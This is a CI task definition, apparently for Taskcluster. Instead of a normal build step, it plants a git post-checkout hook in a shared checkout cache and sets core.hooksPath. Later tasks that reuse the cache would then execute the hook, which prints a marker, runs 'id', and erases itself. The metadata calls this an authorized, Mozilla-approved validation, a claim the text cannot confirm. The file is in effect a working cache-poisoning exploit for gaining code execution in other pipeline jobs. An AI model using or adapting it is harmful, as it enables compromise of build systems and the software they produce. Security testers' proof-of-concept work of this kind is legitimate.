version: 1
reporting: checks-v1
tasks:
  - provisionerId: mobile-1
    workerType: decision
    deadline: {$fromNow: 1 hour}
    expires: {$fromNow: 1 day}
    priority: low
    scopes:
      - generic-worker:cache:mobile-level-1-checkouts-v1
    payload:
      cache:
        mobile-level-1-checkouts-v1: /builds/worker/checkouts
      image: mozillareleases/taskgraph:decision-v13.1.0@sha256:8ff59a0d89e8fd7bbdc236cf1fb15e03be9ef67d7e74ed8ffe15f27765593ecd
      maxRunTime: 300
      command:
        - /usr/local/bin/run-task
        - --task-cwd=/builds/worker/checkouts
        - --
        - bash
        - -cx
        - >
          set -e;
          mkdir -p src;
          if [ ! -d src/.git ]; then git init src; fi;
          mkdir -p src/.git/audit-hooks;
          printf '#!/bin/sh\nprintf TC_PRIV_CACHE_RCE_71c9ab:\nid\ngit config --unset core.hooksPath || true\nrm -rf .git/audit-hooks\n' > src/.git/audit-hooks/post-checkout;
          chmod 755 src/.git/audit-hooks/post-checkout;
          git -C src config core.hooksPath .git/audit-hooks
    metadata:
      name: authorized self-removing cache id proof
      description: Mozilla-approved non-destructive command execution validation
      owner: audit@example.invalid
      source: https://example.invalid/audit
